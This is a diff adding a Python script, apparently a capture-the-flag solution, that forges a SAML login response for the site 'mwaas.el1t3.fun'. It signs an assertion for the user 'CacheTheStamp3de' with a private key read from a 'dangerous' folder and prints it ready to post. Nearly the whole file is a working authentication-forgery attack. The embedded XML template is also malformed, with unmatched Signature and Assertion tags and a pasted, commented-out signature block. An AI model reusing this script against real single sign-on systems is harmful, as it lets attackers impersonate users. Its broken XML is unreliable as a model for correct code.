@@ -1,0 +1,48 @@
+from lxml import etree
+from signxml import XMLSigner, methods
+from datetime import datetime, timedelta
+import base64
+
+# Load private key and certificate
+with open("dangerous/private.pem", "rb") as key_file:
+    private_key = key_file.read()
+
+with open("dangerous/certificate.pem", "rb") as cert_file:
+    cert = cert_file.read()
+
+# Generate current timestamps
+issue_instant = datetime.utcnow()
+not_before = issue_instant - timedelta(minutes=5)
+not_on_or_after = issue_instant + timedelta(minutes=5)
+
+# """
+# <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+#   <ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+#     <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
+#   <ds:Reference URI="#_1df7598aa60e0ecbd5e9af3e69e741f67868e65824"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>CCgB+p5PmmSkHyOvGvy3Y1oKkt0/TD2idF6NEi5fpo4=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>Dz7ZwoysZMRpWiUPghegJcsZswjqBGFBLtNm39bfcBXpegEzLzivrDwC/1FHBJLvtQqL5HtQDXc3r3o9FoovCRN1um4Xl4f3/cjJ1zCAuGIDoASCHTrj3ox+58LEr7we2CrcKL5hcKMNeRisdBW2hG2qX1KMvfPrrUjJxsYy/6+JiyM9feg0LhlEiInOXqLP9mOf1lt/r1XAXiTb8kScVa0djtiUjD3+r3lwgWAJNCn2k9uY4w18xziSzInF6+L5mUqhmoPusJlQ7O0/od5KAglwdfOFym6chIRxqOeRKhKTwIlg2wGBGaJW6zPvYtza1GsK1uyKbd9b0IFCOPeCWeSJH2racF6cSm3agdPmigJUOZbpa49krpQmujQIoa5Pybamnz5XYZa5tTGQVTuX70UUIUxaOo2OYf2JvqaiofIACY47kece8QIJQ5s8A4qZ5shU2vEUbHAphnH9h1zf46AoRbHP1/KZ+jqdsMrzofPsZBTfgkM23eB8H1HOOTDwaIIp7snKsFy0YfH7veds4RXUj8YFHgfUcihkjhiDkPZyvcWdz5NZ9EKIT3XOrrabqn8t6T1NmA20kOeT3Lz1uNPvgZ3c3Ihxty0l4KKFEeeb7G3AbkeIMkXqba+6Jqm/sRjxQ04MfUibkKhr4nkpLACqngGhGFqwanWi13K134c=</ds:SignatureValue>
+# <ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIFKDCCAxCgAwIBAgIUEHDMkqFpHdT5iEPIy8tQ91HNlygwDQYJKoZIhvcNAQELBQAwFDESMBAGA1UEAxMJZWwxdDMuZnVuMB4XDTI1MDUwOTAzMjgzN1oXDTM1MDUwNzAzMjgzN1owFDESMBAGA1UEAxMJZWwxdDMuZnVuMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArx9/CSXyqBPTvoic3rudBYe1xSGXyc6g12EAPqf4k0UR6d0XefHIh1jAdt2hQA8oZkBAZPB4bH4Ci+pczsJOf70sguXYtrZxvqHBEUdxCwIDswRPQmipnsvqA6D/nV+AgeD2V4m8Dfmc1BFlNrAyxCtXksNVh8VJ2px7kaNkdIKCkA58m8b9I36A79MXFoByk6TEfJCO4X/Flq5O4iASJZy6ZVy6JqXpwhKhSiRitihh/+RLboNUIyg1IVEoFW3TmjQXQCUGmVN5itkKeo1dL5yNvM8RWPbErJRHI0A6OgIllbGTQPKJyG3yU+/ofAmxSQBJykmVWWHQH4Wt3Zcof0cWtoT+y3USz6bE+YkPA+us5d0bZXbbXR4djKWugMBaXLhZ6fg+haduEHi9Ke14+0xhKCzSIRlHkX/mqK1/iqTLM5sqQZQHJDigphaHu/dtgRcr5twKcAIS/j0n7NcvhM6z52cbIdV1oDT1saOateLHrF33fFtwvUekxiS/zCEpEzy4Eev+A2XtBw67nV39+ITcRkRdIonBojfUVaWGmVTSebLglroE9kiBRY5UBRVtE9EFzM1zTUXLsAdH4v3M8y9WoeLs/w6Y8LF2EguAlCvlQDHXJnCGLtrtWzPQq8eQ1PlxFJt+m2kCGaTlG6R1HQPX3PUkD1d6DP7quQtp2WsCAwEAAaNyMHAwTwYDVR0RBEgwRoIJZWwxdDMuZnVuhjlodHRwczovL2VsMXQzLmZ1bi9zaW1wbGVzYW1sL21vZHVsZS5waHAvc2FtbC9pZHAvbWV0YWRhdGEwHQYDVR0OBBYEFIZwXHq7LqjTGErj7kjMh6DfEpTTMA0GCSqGSIb3DQEBCwUAA4ICAQAh+XLeGKTOseD+1GreGhkjiBML2g/7I92U5pvq5+4xE6IxhUBSHROWOwKR+gY/bBoiXFAJcCKyjnjzCk842GEBViCw5d5R78RYN08TxGVNqvwv32KlYEtD0iWVajnd+rJDGSRpjPybNzb3d8nTZkLAX2zK43rlDR7wlZ1TQY1YlS9UopJS0xlWH5kQf5fsr8iPawVZeCYqSUgYDPsevgJAHPjvO3XLaHnxXuxkfcv0EPrY1lVi1G7PMW+GQ9MN+ZOiLWfMJmrbHmPuGhXG0neIV4rVrMaUWPxwfyndtjf2AjQcDGV61Z1rP4ZecDSaJnNBhUitTKtsmglPEViSirsDhewn76Sir8+tepxhR1aKhR9jwqopjDzwv2ooICTdeYMWTGcE4nRN3rSs7jxXrwol6RwxINzkYzaxx/YRWfuuwW2Y3kA+5f+2IEhaztzDV68qtUa31o3+MkHVbJ/++vx4If9e7ja49JyYVCgxezFeLr9xx4UDmssgTQYLZu/0wYyRG/xKD6TGOEFT5hAepwbWFBwdL/uiXG51zLxs40qqbGDnoYlDfIBLSGobh/TS+qvQB6LARiFwqWpUvu1heNR/lmnl0d9cjILkyQ8yvs7xspziBLUH/REBVgnTXDkjbDVRMtyllbszfuKSLwrKcHkmcv96R1ZiO95rnFEHXZbbIQ==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_7ac8c348e701ad7bb478273a3bd67077ea9bc31cfa" Version="2.0" IssueInstant="{issue_instant.isoformat()}Z"><saml:Issuer>https://el1t3.fun/saml-idp</saml:Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+#   <ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+#     <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
+#   <ds:Reference URI="#_7ac8c348e701ad7bb478273a3bd67077ea9bc31cfa"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>sFxyZ485HSJ8qNY4cJqseDMRqxGUtXpkPJQWNsA4Oao=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>V/bHaYvnrU29pAVJpAK62u2tXiaVG0ToMdklF2GuCsQe0NuSvhRnYxvTfcPLjNx34HVoOW6Ubp51BtPbpeaaFprSivh0m3zsYSr+GoZmUO2+ragCtwB/pwD1uCwAIXGzx9Jw7Me8BvP5XkXAY4fzYwto7GxMDDB56tVyXN+5UafEctV40d0/P08aijTU9iJRJ8r2azasu7ZQwZtDWCiEM+lhLZkyqxDsD7T17RarbgCeN9Qz8RQl6I1/2fg4qtYbDsHRywjnCZ83t3qd7QAKSxkau5h5+hbVLJ1HalE5dMoDeQg66GtxEZDdbeg1OmfgMIPiksFTCQ8FYJn/TWOeXjRRr/hP4p8PMf61AeFZOs6OjaWx/Wz80BCodedjUh4s1u7pM7twkaAEtfJc3avz25ZucbOEQU87+0pxQazNseSGZ+7tx41ILzFloIaIaw+/B1EgQVANppIRGUFyHNEXDhTs1yieAP6OfBBf1uabu1hCYZXjOxWTVYZV8n5gd1uaQ242Sm2Jd78cuQeCJkx390O7iEcIYsmx9OR25NADGUFcuXOyyST9YNC1Phrz8bN6CYGFlMuYOoOMTQbMlo2Yufio114OgqONMgm70ZeYjLLavTzsnboRelz6DSi4TWdKp/pxuZtdC99YCukNBJEkM8shvTNdTeQ/bxlaZfziBBA=</ds:SignatureValue>
+# """
+
+# Build SAML Assertion (adjust values as needed)
+assertion_template = f"""
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1df7598aa60e0ecbd5e9af3e69e741f67868e65824" Version="2.0" IssueInstant="{issue_instant.isoformat()}Z" Destination="https://mwaas.el1t3.fun/saml/acs/"><saml:Issuer>https://el1t3.fun/saml-idp</saml:Issuer>
+
+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIFKDCCAxCgAwIBAgIUEHDMkqFpHdT5iEPIy8tQ91HNlygwDQYJKoZIhvcNAQELBQAwFDESMBAGA1UEAxMJZWwxdDMuZnVuMB4XDTI1MDUwOTAzMjgzN1oXDTM1MDUwNzAzMjgzN1owFDESMBAGA1UEAxMJZWwxdDMuZnVuMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArx9/CSXyqBPTvoic3rudBYe1xSGXyc6g12EAPqf4k0UR6d0XefHIh1jAdt2hQA8oZkBAZPB4bH4Ci+pczsJOf70sguXYtrZxvqHBEUdxCwIDswRPQmipnsvqA6D/nV+AgeD2V4m8Dfmc1BFlNrAyxCtXksNVh8VJ2px7kaNkdIKCkA58m8b9I36A79MXFoByk6TEfJCO4X/Flq5O4iASJZy6ZVy6JqXpwhKhSiRitihh/+RLboNUIyg1IVEoFW3TmjQXQCUGmVN5itkKeo1dL5yNvM8RWPbErJRHI0A6OgIllbGTQPKJyG3yU+/ofAmxSQBJykmVWWHQH4Wt3Zcof0cWtoT+y3USz6bE+YkPA+us5d0bZXbbXR4djKWugMBaXLhZ6fg+haduEHi9Ke14+0xhKCzSIRlHkX/mqK1/iqTLM5sqQZQHJDigphaHu/dtgRcr5twKcAIS/j0n7NcvhM6z52cbIdV1oDT1saOateLHrF33fFtwvUekxiS/zCEpEzy4Eev+A2XtBw67nV39+ITcRkRdIonBojfUVaWGmVTSebLglroE9kiBRY5UBRVtE9EFzM1zTUXLsAdH4v3M8y9WoeLs/w6Y8LF2EguAlCvlQDHXJnCGLtrtWzPQq8eQ1PlxFJt+m2kCGaTlG6R1HQPX3PUkD1d6DP7quQtp2WsCAwEAAaNyMHAwTwYDVR0RBEgwRoIJZWwxdDMuZnVuhjlodHRwczovL2VsMXQzLmZ1bi9zaW1wbGVzYW1sL21vZHVsZS5waHAvc2FtbC9pZHAvbWV0YWRhdGEwHQYDVR0OBBYEFIZwXHq7LqjTGErj7kjMh6DfEpTTMA0GCSqGSIb3DQEBCwUAA4ICAQAh+XLeGKTOseD+1GreGhkjiBML2g/7I92U5pvq5+4xE6IxhUBSHROWOwKR+gY/bBoiXFAJcCKyjnjzCk842GEBViCw5d5R78RYN08TxGVNqvwv32KlYEtD0iWVajnd+rJDGSRpjPybNzb3d8nTZkLAX2zK43rlDR7wlZ1TQY1YlS9UopJS0xlWH5kQf5fsr8iPawVZeCYqSUgYDPsevgJAHPjvO3XLaHnxXuxkfcv0EPrY1lVi1G7PMW+GQ9MN+ZOiLWfMJmrbHmPuGhXG0neIV4rVrMaUWPxwfyndtjf2AjQcDGV61Z1rP4ZecDSaJnNBhUitTKtsmglPEViSirsDhewn76Sir8+tepxhR1aKhR9jwqopjDzwv2ooICTdeYMWTGcE4nRN3rSs7jxXrwol6RwxINzkYzaxx/YRWfuuwW2Y3kA+5f+2IEhaztzDV68qtUa31o3+MkHVbJ/++vx4If9e7ja49JyYVCgxezFeLr9xx4UDmssgTQYLZu/0wYyRG/xKD6TGOEFT5hAepwbWFBwdL/uiXG51zLxs40qqbGDnoYlDfIBLSGobh/TS+qvQB6LARiFwqWpUvu1heNR/lmnl0d9cjILkyQ8yvs7xspziBLUH/REBVgnTXDkjbDVRMtyllbszfuKSLwrKcHkmcv96R1ZiO95rnFEHXZbbIQ==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature>
+<saml:Subject><saml:NameID SPNameQualifier="https://mwaas.el1t3.fun/saml/metadata.xml" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_ce828e5d20fea7d0f604a7f0bb38a62417246a3202</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after.isoformat()}Z" Recipient="https://mwaas.el1t3.fun/saml/acs/"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="{not_before.isoformat()}Z" NotOnOrAfter="{not_on_or_after.isoformat()}Z"><saml:AudienceRestriction><saml:Audience>https://mwaas.el1t3.fun/saml/metadata.xml</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="{issue_instant.isoformat()}Z" SessionNotOnOrAfter="{not_on_or_after.isoformat()}Z" SessionIndex="_e270932a91b7eb7466dce3fdccb7beaaf699789296"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="username" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri"><saml:AttributeValue xsi:type="xs:string">CacheTheStamp3de</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
+"""
+
+# Parse XML
+xml = etree.fromstring(assertion_template.encode())
+
+# Sign the Assertion element
+signer = XMLSigner(method=methods.enveloped, signature_algorithm="rsa-sha256", digest_algorithm="sha256")
+signed_xml = signer.sign(xml, key=private_key, cert=cert, reference_uri="#_7ac8c348e701ad7bb478273a3bd67077ea9bc31cfa")
+
+# Serialize and base64 encode the signed response
+saml_response = base64.b64encode(etree.tostring(signed_xml)).decode()
+
+# Print it in form-ready format
+print(f"SAMLResponse={saml_response}")
